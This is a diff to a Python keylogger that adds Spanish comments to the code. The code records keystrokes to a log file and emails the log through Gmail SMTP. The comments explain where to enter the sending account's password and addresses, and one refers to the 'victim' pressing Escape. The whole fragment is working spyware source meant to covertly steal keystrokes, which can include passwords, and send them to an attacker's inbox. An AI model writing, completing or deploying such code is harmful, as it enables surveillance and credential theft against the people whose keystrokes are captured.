@@ -15,11 +15,11 @@ log_file = open("log.txt", "w+")
 
 def enviar_datos():
     msg = MIMEMultipart()
-    password = ""
-    msg['From'] = ""
-    msg['To'] = ""
-    msg['Subject'] = "Keylogger Data"
-    msg.attach(MIMEText(open('log.txt').read()))
+    password = "" #Contraseña del correo#
+    msg['From'] = "" #Aca es desde donde se va enviar la informacion (debe ser un correo)#
+    msg['To'] = "" #Correo a donde va llegar la informacion (recomendado ser el mismo correo)#
+    msg['Subject'] = "Keylogger Data" #Asunto del correo#
+    msg.attach(MIMEText(open('log.txt').read())) #Abre el archivo y su info#
     #Capturar errores#
     try:
         server = smtplib.SMTP('smtp.gmail.com:587')
@@ -28,11 +28,11 @@ def enviar_datos():
         server.sendmail(msg['From'], msg['To'], msg.as_string())
         server.quit()
     except:
-        print("Error al enviar el correo")
+        print("Error al enviar el correo") #Capturar errores si no da
 #Funciones
 def presiona(key):
     key1 = convert(key)
-    if key1 == "Key.esc":
+    if key1 == "Key.esc": #Si la victima presiona 'esc' se termina el proceso#
         print("Saliendo...")
         imprimir()
         return False
